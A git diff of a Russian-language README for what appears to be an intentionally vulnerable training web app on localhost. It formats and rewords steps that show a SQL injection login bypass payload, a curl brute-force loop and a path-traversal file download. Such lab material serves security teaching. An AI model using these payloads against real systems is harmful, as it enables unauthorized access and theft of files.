@@ -47,11 +47,12 @@ cp .env.example .env
 curl 'http://localhost:8080/register' --data-raw 'username=admin&password=supersecurepassword'
 ```
 2. Допустим мы знаем что админ есть в системе. Тогда мы можем войти через его аккаунт:
-```bash
-1. Логин: a' UNION SELECT 'admin','$2y$04$QMuPN3FQ4EtmNAx.mPGY5e3C9UIibGaX/U.uvknhOLadNwtEA.iH6' --
-2. Пароль: 1234
-```
-3. Вход от админа успешен
+
+      Логин: ```a' UNION SELECT 'admin','$2y$04$QMuPN3FQ4EtmNAx.mPGY5e3C9UIibGaX/U.uvknhOLadNwtEA.iH6' --```
+
+      Пароль: ```1234```
+
+4. Вход от админа успешен
 
 ### 3. Brute force
 1. Запустите испровизированный брут, который будет перебирать пароль: 
@@ -66,7 +67,7 @@ seq 50 | xargs -P50 -I{} curl -s -o /dev/null -w "%{http_code}\n" 'http://localh
 ```bash
 http://localhost:8080/files?name=e5fedb3b-9717-44b6-a68b-a2bb042f4409.png
 ```
-3. После этого мы можем скачать любой файл с сервера, заменив имя файла в ссылке:
+3. После этого можно скачать любой файл с сервера, заменив имя файла в ссылке:
 ```bash
 curl http://localhost:8080/files?name=../main.go
 ```
